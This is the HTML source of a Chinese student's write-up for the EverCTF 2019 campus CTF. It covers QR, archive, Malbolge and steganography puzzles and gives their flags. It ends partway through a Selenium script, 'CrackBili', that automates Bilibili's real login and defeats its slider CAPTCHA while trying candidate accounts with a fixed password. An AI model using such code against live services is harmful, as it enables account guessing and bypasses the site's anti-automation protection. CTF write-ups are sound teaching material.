@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.css">
+  <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+
+<script class="next-config" data-name="main" type="application/json">{&quot;hostname&quot;:&quot;htharoldht.com&quot;,&quot;root&quot;:&quot;&#x2F;&quot;,&quot;images&quot;:&quot;&#x2F;images&quot;,&quot;scheme&quot;:&quot;Mist&quot;,&quot;version&quot;:&quot;8.4.0&quot;,&quot;exturl&quot;:true,&quot;sidebar&quot;:{&quot;position&quot;:&quot;left&quot;,&quot;display&quot;:&quot;post&quot;,&quot;padding&quot;:18,&quot;offset&quot;:12},&quot;copycode&quot;:true,&quot;bookmark&quot;:{&quot;enable&quot;:true,&quot;color&quot;:&quot;#222&quot;,&quot;save&quot;:&quot;auto&quot;},&quot;fancybox&quot;:true,&quot;mediumzoom&quot;:false,&quot;lazyload&quot;:true,&quot;pangu&quot;:true,&quot;comments&quot;:{&quot;style&quot;:&quot;tabs&quot;,&quot;active&quot;:null,&quot;storage&quot;:true,&quot;lazyload&quot;:false,&quot;nav&quot;:null},&quot;motion&quot;:{&quot;enable&quot;:true,&quot;async&quot;:false,&quot;transition&quot;:{&quot;post_block&quot;:&quot;fadeIn&quot;,&quot;post_header&quot;:&quot;fadeInDown&quot;,&quot;post_body&quot;:&quot;fadeInDown&quot;,&quot;coll_header&quot;:&quot;fadeInLeft&quot;,&quot;sidebar&quot;:&quot;fadeInUp&quot;}},&quot;prism&quot;:false,&quot;i18n&quot;:{&quot;placeholder&quot;:&quot;搜索...&quot;,&quot;empty&quot;:&quot;没有找到任何搜索结果：${query}&quot;,&quot;hits_time&quot;:&quot;找到 ${hits} 个搜索结果（用时 ${time} 毫秒）&quot;,&quot;hits&quot;:&quot;找到 ${hits} 个搜索结果&quot;}}</script>
+<meta name="description" content="EverCTF 是北京科技大学第二届 CTF 校赛, 花了一周的时间练练一些题, 菜鸡一枚. 过去水了水">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EverCTF_2019 WriteUp">
+<meta property="og:url" content="https://htharoldht.com/everctf2019-writeup/index.html">
+<meta property="og:site_name" content="有龙则灵">
+<meta property="og:description" content="EverCTF 是北京科技大学第二届 CTF 校赛, 花了一周的时间练练一些题, 菜鸡一枚. 过去水了水">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-01-10-13-03.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-01-10-18-59.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-01-10-19-27.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-01-10-20-00.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-01-10-34-21.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-01-10-36-10.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-02-16-48-44.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-02-11-56-54.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-02-18-59-40.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-01-11-10-19.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-01-11-19-45.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-01-11-22-05.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-01-11-50-43.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-01-11-50-09.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-01-11-49-21.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-02-17-04-55.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-01-11-52-42.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-01-11-53-35.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-01-11-55-41.png">
+<meta property="og:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-03-00-38-52.png">
+<meta property="article:published_time" content="2019-04-01T04:01:24.000Z">
+<meta property="article:modified_time" content="2021-05-29T07:57:25.826Z">
+<meta property="article:author" content="有龙则灵">
+<meta property="article:tag" content="USTB">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="EverCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://htharoldht.com/everctf2019-writeup/2019-04-01-10-13-03.png">
+
+
+<link rel="canonical" href="https://htharoldht.com/everctf2019-writeup/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{&quot;sidebar&quot;:&quot;&quot;,&quot;isHome&quot;:false,&quot;isPost&quot;:true,&quot;lang&quot;:&quot;zh-CN&quot;,&quot;comments&quot;:true,&quot;permalink&quot;:&quot;https:&#x2F;&#x2F;htharoldht.com&#x2F;everctf2019-writeup&#x2F;&quot;,&quot;path&quot;:&quot;everctf2019-writeup&#x2F;&quot;,&quot;title&quot;:&quot;EverCTF_2019 WriteUp&quot;}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">&quot;&quot;</script>
+<title>EverCTF_2019 WriteUp | 有龙则灵</title><script src="/js/config.js"></script>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">有龙则灵</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">冯唐易老，李广难封</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+        <li class="menu-item menu-item-留言板"><a href="/guestbook/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>留言板</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">1.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#jigsaw"><span class="nav-number">1.1.</span> <span class="nav-text">jigsaw</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%9B%E5%B0%94%E5%8D%9A%E5%90%89"><span class="nav-number">1.2.</span> <span class="nav-text">玛尔博吉</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%84%E7%BD%97%E6%96%AF%E5%A5%97%E5%8C%85"><span class="nav-number">1.3.</span> <span class="nav-text">俄罗斯套包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B0%B8%E8%BF%9C%E4%B9%9F%E7%8C%9C%E4%B8%8D%E5%88%B0%E7%9A%84%E5%AF%86%E7%A0%81"><span class="nav-number">1.4.</span> <span class="nav-text">永远也猜不到的密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BA%A2%E7%8E%AB%E7%91%B0%E4%B8%8E%E7%99%BD%E7%8E%AB%E7%91%B0"><span class="nav-number">1.5.</span> <span class="nav-text">红玫瑰与白玫瑰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BF%83%E8%B7%B3%E5%8A%A0%E9%80%9F"><span class="nav-number">1.6.</span> <span class="nav-text">心跳加速</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re"><span class="nav-number">2.</span> <span class="nav-text">Re</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-number">3.</span> <span class="nav-text">Pwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ppc"><span class="nav-number">4.</span> <span class="nav-text">Ppc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Blockchain"><span class="nav-number">5.</span> <span class="nav-text">Blockchain</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cockroach"><span class="nav-number">5.1.</span> <span class="nav-text">cockroach</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">6.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B6%B3%E5%A4%9F%E5%AE%89%E5%85%A8%E7%9A%84-RSA"><span class="nav-number">6.1.</span> <span class="nav-text">足够安全的 RSA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%A0%E5%AE%A2%E8%A1%8C"><span class="nav-number">6.2.</span> <span class="nav-text">侠客行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RSA-%E5%85%B1%E6%A8%A1"><span class="nav-number">6.3.</span> <span class="nav-text">RSA 共模</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">7.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%8F%82%E5%8A%A0%E6%AF%94%E8%B5%9B"><span class="nav-number">7.1.</span> <span class="nav-text">欢迎来参加比赛</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">7.2.</span> <span class="nav-text">签到题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ping"><span class="nav-number">7.3.</span> <span class="nav-text">ping?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E5%AF%86%E7%A0%81"><span class="nav-number">7.4.</span> <span class="nav-text">猜密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%82%B9%E6%88%91%E4%B8%80%E4%B8%8B%E5%B0%B1%E7%BB%99%E4%BD%A0-flag"><span class="nav-number">7.5.</span> <span class="nav-text">点我一下就给你 flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%83%AD%E8%BA%AB"><span class="nav-number">7.6.</span> <span class="nav-text">注入热身</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%A6%E8%AE%A4%E4%B8%89%E8%BF%9E"><span class="nav-number">7.7.</span> <span class="nav-text">否认三连</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#404-%E7%9A%84%E5%8D%B1%E6%9C%BA"><span class="nav-number">7.8.</span> <span class="nav-text">404 的危机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%9D%E5%AF%B9%E5%AE%89%E5%85%A8%E7%9A%84-blog"><span class="nav-number">7.9.</span> <span class="nav-text">绝对安全的 blog</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="有龙则灵"
+      src="/images/logo.jpg">
+  <p class="site-author-name" itemprop="name">有龙则灵</p>
+  <div class="site-description" itemprop="description">北京科技大学16级本科信息安全在读。</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="sidebar-button site-overview-item animated"><i class="fa fa-comment"></i>
+    Chat
+  </a>
+  </div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2h0aGFyb2xkaHQ=" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;htharoldht"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOmh0aGFyb2xkaHRAZ21haWwuY29t" title="E-Mail → mailto:htharoldht@gmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly91c2VyLnF6b25lLnFxLmNvbS8xOTc5ODY2ODEw" title="QQ → https:&#x2F;&#x2F;user.qzone.qq.com&#x2F;1979866810"><i class="fa fa-qq fa-fw"></i>QQ</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3Blb3BsZS95b3UtbG9uZy16ZS1saW5nLTcwL2FjdGl2aXRpZXM=" title="知乎 → https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;you-long-ze-ling-70&#x2F;activities"><i class="gratipay fa-fw"></i>知乎</span>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1IYW5z"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://htharoldht.com/everctf2019-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/logo.jpg">
+      <meta itemprop="name" content="有龙则灵">
+      <meta itemprop="description" content="北京科技大学16级本科信息安全在读。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="有龙则灵">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          EverCTF_2019 WriteUp
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2019-04-01 12:01:24" itemprop="dateCreated datePublished" datetime="2019-04-01T12:01:24+08:00">2019-04-01</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-05-29 15:57:25" itemprop="dateModified" datetime="2021-05-29T15:57:25+08:00">2021-05-29</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.9k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <div class="note warning"><p>EverCTF 是北京科技大学第二届 CTF 校赛, 花了一周的时间练练一些题, 菜鸡一枚. 过去水了水</p>
+</div>
+<span id="more"></span>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="jigsaw"><a href="#jigsaw" class="headerlink" title="jigsaw"></a>jigsaw</h3><p>二维码拼图, 还需要反转一下颜色.<br><img data-src="2019-04-01-10-13-03.png"><br>扫描得到 flag</p>
+<blockquote>
+<p>everctf{qR_c0de_1s_g00d}</p>
+</blockquote>
+<h3 id="玛尔博吉"><a href="#玛尔博吉" class="headerlink" title="玛尔博吉"></a>玛尔博吉</h3><p>打开文件, 复制代码, 粘贴到 <span class="exturl" data-url="aHR0cDovL3d3dy5jb21waWxlb25saW5lLmNvbS9leGVjdXRlX21hbGJvbGdlX29ubGluZS5waHA=">这里<i class="fa fa-external-link-alt"></i></span>, 运行即得到 flag</p>
+<blockquote>
+<p>everctf{m41b0lge_1s_4maz1ing}</p>
+</blockquote>
+<h3 id="俄罗斯套包"><a href="#俄罗斯套包" class="headerlink" title="俄罗斯套包"></a>俄罗斯套包</h3><p>解压后不断得到新的压缩包, 气到了, 直接 winhex 打开, 搜索 flag, 找到最后一个,<br><img data-src="2019-04-01-10-18-59.png"><br>将最后的片段新建保存, 解压, 打开, 得到 txt, 打开得到 flag.<br><img data-src="2019-04-01-10-19-27.png"></p>
+<blockquote>
+<p>everctf{z1P_z4p_Z1p_zap}</p>
+</blockquote>
+<h3 id="永远也猜不到的密码"><a href="#永远也猜不到的密码" class="headerlink" title="永远也猜不到的密码"></a>永远也猜不到的密码</h3><p>这个题是真的有趣, 打开压缩包, 打开 word, 启用编辑, 然后<br><img data-src="2019-04-01-10-20-00.png"><br>是的, 没错！word 提示了拼写错误！！！感谢巨硬, 一直被我 diss 的拼写检查还是有功的！！<br>so, 直接全选, 复制, 粘贴, 搞定, 不带走云彩.</p>
+<blockquote>
+<p>everctf{The_m05t_d4nger0u5 _1s_the_s4fe5t}</p>
+</blockquote>
+<h3 id="红玫瑰与白玫瑰"><a href="#红玫瑰与白玫瑰" class="headerlink" title="红玫瑰与白玫瑰"></a>红玫瑰与白玫瑰</h3><p>没说的, 直接 binwalk, 看到<br><img data-src="2019-04-01-10-34-21.png"><br>自动分离后, 得到的东西有点点难受<br><img data-src="2019-04-01-10-36-10.png"><br>想着是不是里面改了文件头, 于是 WinHex 修改<br>。。。<br>然并卵, 暂时跳过<br>有提示了, LSB, 打开 StegSolve 一阵乱点, 还是没用。。。放弃<br>(后来知道是 bgr。。。没用乱点这个。。。最开始还以为红玫瑰与白玫瑰, 是要把两张图片做与然后找 LSB 呢。。。)</p>
+<h3 id="心跳加速"><a href="#心跳加速" class="headerlink" title="心跳加速"></a>心跳加速</h3><p>Github 上找代码, 然而能够运行的准确率不高, 据说准确率高的却不能运行。。。真的是相当难受了<br>还是硬刚吧, 把能够运行的代码改了改, 然后就只需要自己拼图了<br>在尝试了估计有 300 多次的拼图后, 终于第 262 个找到了<br>账号是: fdddbdbfbb973<br>来看看这句诗是什么呢?<br><img data-src="2019-04-02-16-48-44.png"><br>切, 我还以为是 “苟利国家生死以” 的英语版呢。。。<br>可以说是十分羡慕那些全程用代码实现的 dalao 了, 要不是 dalao 鼓励说不超过 300, 我还真的就不想拼图了<br>最后, 这道题告诉我, 拼图还是很好玩的, 尤其是在无聊的情况下 (手动黑脸. jpg)<br>附修改后的手动拼图代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> TimeoutException</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USER_NAME = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 账户</span></span><br><span class="line">PASSWORD = <span class="string">&#x27;qqq111&#x27;</span>  <span class="comment"># 密码</span></span><br><span class="line">MULTIPE = <span class="number">1.5</span>  <span class="comment"># 显示比例，我这里是 150%</span></span><br><span class="line">BORDER = <span class="number">6</span>  <span class="comment"># 滑块左侧在验证码图片上的 x 轴坐标为 6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CrackBili</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.url = <span class="string">&#x27;https://passport.bilibili.com/login&#x27;</span></span><br><span class="line">        self.browser = webdriver.Chrome()</span><br><span class="line">        